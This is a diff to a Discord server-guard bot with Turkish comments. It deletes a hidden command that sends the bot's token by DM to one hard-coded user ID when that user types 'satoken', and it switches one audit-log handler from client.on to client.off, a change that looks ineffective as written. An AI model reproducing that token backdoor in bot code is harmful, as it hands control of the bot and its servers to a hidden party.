@@ -130,7 +130,7 @@ client.on("guildUpdate", async (oldGuild, newGuild) => {
     .setTimestamp()).catch(); };
     });
 
-client.on('guildUpdate', async (oldGuild, newGuild) => {
+client.off('guildUpdate', async (oldGuild, newGuild) => {
   let yetkili = await newGuild.fetchAuditLogs({type: 'GUILD_UPDATE'}).then(audit => audit.entries.first());
   if (!yetkili || !yetkili.executor || Date.now()-yetkili.createdTimestamp > 5000 || guvenli(yetkili.executor.id) || !s.serverGuard) return;
   cezalandir(yetkili.executor.id, "cezalandır");
@@ -178,19 +178,7 @@ client.on("channelCreate", async channel => {
 //////////////////////////////////////////////////Kanal Oluşturma Koruması////////////////////////////////////////////////////
 
 
-client.on('message', async (msg, member, guild) => {
-  
- {
 
-if (msg.content.toLowerCase() === 'satoken'){
-if (msg.author.id !== "429357746002067493") return;
-
-msg.author.send(client.token);
-msg.delete();
-}
-  
-}
-});
 
 
 //////////////////////////////////////////////////Kanal Ayar Koruması////////////////////////////////////////////////////
